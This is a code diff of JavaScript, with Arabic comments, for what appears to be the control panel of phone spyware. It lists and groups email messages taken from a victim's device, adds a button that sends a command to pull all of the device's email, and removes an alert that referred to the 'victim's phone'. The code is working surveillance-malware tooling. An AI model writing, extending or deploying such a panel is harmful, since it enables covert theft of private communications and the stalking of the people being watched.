@@ -212,7 +212,7 @@ async function loadDeleted() {
     } catch (e) {}
 }
 
-// ✅ تحميل رسائل البريد الإلكتروني
+// ✅ تحميل رسائل البريد — مجمعة في مربعات
 async function loadEmails() {
     try {
         const response = await fetch(`/api.php?action=get_emails&device=${encodeURIComponent(currentDevice)}`);
@@ -228,24 +228,72 @@ async function loadEmails() {
             return;
         }
         
+        const groups = {};
         emails.forEach(email => {
-            const item = document.createElement('div');
-            item.className = 'conversation-item';
-            item.innerHTML = `
+            const app = email.app_name || 'Email';
+            if (!groups[app]) groups[app] = [];
+            groups[app].push(email);
+        });
+        
+        Object.keys(groups).forEach(app => {
+            const appEmails = groups[app];
+            const lastEmail = appEmails[0];
+            
+            const groupDiv = document.createElement('div');
+            groupDiv.className = 'conversation-item';
+            groupDiv.style.cursor = 'pointer';
+            groupDiv.onclick = () => openEmailGroup(app, groupDiv);
+            
+            groupDiv.innerHTML = `
                 <div class="conversation-avatar">📧</div>
                 <div class="conversation-info">
-                    <div class="conversation-name">${email.app_name || 'Email'} — ${email.sender || 'غير معروف'}</div>
-                    <div class="conversation-preview">${email.subject || ''}</div>
-                    <div class="conversation-time">📅 ${formatDate(email.timestamp)}</div>
+                    <div class="conversation-name">${app}</div>
+                    <div class="conversation-preview">${lastEmail.subject || ''}</div>
+                    <div class="conversation-time">📅 ${formatDate(lastEmail.timestamp)} | عدد الرسائل: ${appEmails.length}</div>
                 </div>
+                <div class="conversation-count">${appEmails.length}</div>
             `;
-            div.appendChild(item);
+            
+            div.appendChild(groupDiv);
         });
         
         const badge = document.getElementById('emailsCount');
         if (badge) badge.textContent = `(${emails.length})`;
         
     } catch (e) {}
+}
+
+// ✅ فتح مجموعة بريد
+function openEmailGroup(app, groupDiv) {
+    const existingBox = groupDiv.nextElementSibling;
+    if (existingBox && existingBox.classList.contains('email-box')) {
+        existingBox.remove();
+        return;
+    }
+    
+    const box = document.createElement('div');
+    box.className = 'email-box';
+    box.style.cssText = 'background:#0a0a0a;border:1px solid #00ffcc;border-radius:10px;padding:15px;margin-bottom:10px;max-height:400px;overflow-y:auto;animation:fadeIn 0.3s;';
+    
+    fetch(`/api.php?action=get_emails&device=${encodeURIComponent(currentDevice)}`)
+        .then(res => res.json())
+        .then(emails => {
+            const appEmails = emails.filter(e => (e.app_name || 'Email') === app)
+                .sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+            
+            appEmails.forEach(email => {
+                const item = document.createElement('div');
+                item.style.cssText = 'padding:12px;border-bottom:1px solid #222;';
+                item.innerHTML = `
+                    <div style="color:#00ffcc;font-size:14px;font-weight:bold;">📧 ${email.sender || 'غير معروف'}</div>
+                    <div style="color:#ccc;font-size:13px;margin-top:3px;">${email.subject || ''}</div>
+                    <div style="color:#888;font-size:11px;margin-top:3px;">📅 ${formatDate(email.timestamp)}</div>
+                `;
+                box.appendChild(item);
+            });
+            
+            groupDiv.after(box);
+        });
 }
 
 // ✅ زر سحب كل البريد
@@ -258,7 +306,7 @@ async function readAllEmails() {
         const result = await response.json();
         
         if (result.success) {
-            alert('✅ تم إرسال الأمر — سيظهر إشعار على هاتف الضحية لتفعيل الوصول');
+            alert('✅ تم إرسال الأمر');
         } else {
             alert('❌ خطأ: ' + (result.error || 'غير معروف'));
         }
